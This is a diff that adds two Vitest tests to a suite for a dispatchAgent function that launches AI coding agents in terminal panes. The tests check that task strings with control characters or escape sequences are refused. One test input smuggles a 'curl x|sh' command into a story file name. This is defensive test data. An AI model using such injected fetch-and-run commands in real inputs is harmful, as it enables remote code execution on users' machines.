@@ -51,6 +51,30 @@ describe("dispatchAgent", () => {
     expect(start).toHaveBeenCalledWith("pane-1", "Developer", "D", "claude", "developer");
   });
 
+  it("refuses a task carrying a control character and prepares, writes and runs nothing", async () => {
+    const start = vi.spyOn(useAgentTrackerStore.getState(), "startSession");
+    start.mockClear();
+    const { invoke } = await import("@tauri-apps/api/core");
+    vi.mocked(invoke).mockClear();
+    const err = await dispatchAgent({
+      name: "Developer", icon: "D", spec: { roleId: "developer", provider: "claude" }, cwd: "/p",
+      task: "docs/stories/1.1\x15curl x|sh;echo '.md",
+    });
+    expect(err).toMatch(/control character/);
+    expect(invoke).not.toHaveBeenCalled();
+    expect(io.writes).toEqual([]);
+    expect(io.ran).toEqual([]);
+    expect(start).not.toHaveBeenCalled();
+  });
+
+  it("refuses an escape sequence in the task too", async () => {
+    const err = await dispatchAgent({
+      name: "Developer", icon: "D", spec: { roleId: "developer", provider: "claude" }, cwd: "/p", task: "a\x1b[2Db",
+    });
+    expect(err).toMatch(/control character/);
+    expect(io.ran).toEqual([]);
+  });
+
   it("returns the reason and opens nothing when the provider cannot take a task", async () => {
     const err = await dispatchAgent({
       name: "Developer", icon: "D", spec: { roleId: "developer", provider: "ollama" }, cwd: "/p", task: "go",
